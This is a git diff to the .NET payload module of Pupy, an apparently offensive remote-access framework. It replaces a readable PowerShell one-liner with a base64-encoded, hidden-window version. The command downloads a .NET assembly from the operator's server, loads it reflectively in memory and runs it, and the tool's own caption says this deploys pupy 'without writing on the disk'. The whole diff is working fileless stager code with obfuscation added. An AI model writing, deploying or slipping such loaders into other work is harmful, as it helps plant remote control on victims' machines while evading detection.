@@ -9,11 +9,18 @@ import random
 
 from string import ascii_uppercase, ascii_lowercase
 from os.path import join, splitext
+from base64 import b64encode
 
 from pupylib.PupyOutput import Success, Error, List
 from pupylib import ROOT
 
 TEMPLATE = join(ROOT, 'payload_templates', 'PupyLoaderTemplate.cs')
+
+PS_TEMPLATE = \
+  "[Reflection.Assembly]::Load(" \
+  "(new-object net.webclient).DownloadData(" \
+  "'http://{link_ip}:{port}{landing_uri}')).GetTypes()[0].GetMethods(" \
+  ")[0].Invoke($null,@())"
 
 class DotNetPayload(object):
     def __init__(self, display, server, conf, rawdll, outpath=None, output_dir=None):
@@ -114,11 +121,14 @@ def dotnet_serve_payload(display, server, rawdll, conf, link_ip="<your_ip>"):
 
     landing_uri = server.pupweb.serve_content(payload, alias='.NET payload')
 
+    command = PS_TEMPLATE.format(
+        link_ip=link_ip,
+        port=server.pupweb.port,
+        landing_uri=landing_uri
+    ).encode('utf-16le')
+
     display(List([
-        "powershell -w hidden -c \"[Reflection.Assembly]::Load("
-                  "(new-object net.webclient).DownloadData("
-                  "'http://{}:{}{}')).GetTypes()[0].GetMethods("
-                  ")[0].Invoke($null,@())\"".format(
-            link_ip, server.pupweb.port, landing_uri),
+        'powershell -w hidden -enc "{}"'.format(
+            b64encode(command)),
     ], caption=Success(
         'Copy/paste this one-line loader to deploy pupy without writing on the disk')))
